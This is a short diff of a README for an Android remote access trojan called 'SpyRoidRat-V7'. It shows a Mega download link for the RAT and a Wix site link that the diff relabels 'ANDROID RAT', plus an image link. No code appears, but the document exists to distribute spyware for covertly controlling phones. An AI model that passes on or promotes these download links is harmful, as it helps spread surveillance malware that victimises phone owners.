@@ -1,7 +1,7 @@
 # SpyRoidRat-V7
 DESCARGA RAT:https://mega.nz/file/Me9WjBia#K3PdDM9DC49A5__dajLvLejI8pctjRAeux4E4CZy1JA
 
-DESCARGA:https://nibiruanuna.wixsite.com/android-rat-spy
++ANDROID RAT:https://nibiruanuna.wixsite.com/android-rat-spy
 
 
 ![SPY](https://github.com/AndroidRat/SpyRoidRat-V7/assets/104788786/04861be8-fe2c-42ab-92d6-718ada64209d)
